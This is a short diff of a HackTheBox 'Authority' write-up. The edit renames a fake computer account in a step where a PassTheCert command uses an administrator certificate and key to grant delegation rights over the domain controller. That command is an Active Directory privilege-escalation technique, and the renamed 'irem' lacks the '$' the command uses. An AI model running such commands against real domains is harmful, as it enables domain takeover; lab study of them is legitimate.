@@ -448,7 +448,7 @@ The one that works is `add_user_to_group`:
 
 **PassTheCert -> TGT [Path 2]**
 
-The intended way to exploit this is to use the `write_rbcd` action to give the fake computer `0xdf$` delegration rights over the DC:
+The intended way to exploit this is to use the `write_rbcd` action to give the fake computer `irem` delegration rights over the DC:
 
 ```bash
 ➜  authority python PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'irem$' -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
